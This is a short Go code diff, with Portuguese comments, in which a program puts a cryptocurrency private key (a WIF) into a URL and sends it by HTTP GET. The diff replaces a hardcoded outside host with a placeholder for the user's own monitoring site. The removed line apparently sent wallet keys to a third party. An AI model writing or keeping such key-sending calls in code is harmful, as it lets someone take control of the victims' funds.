@@ -182,7 +182,7 @@ func main() {
         close(done)
 
         // Montando o URL com o WIF
-        url := fmt.Sprintf("https://xlocgpu.com/verify.php?data=%s", strings.ReplaceAll(wif, " ", "%20"))
+        url := fmt.Sprintf("http://colqueseusitedemonitoramento.php?data=%s", strings.ReplaceAll(wif, " ", "%20"))
 
         // Fazendo a requisição GET
         resp, err := http.Get(url)
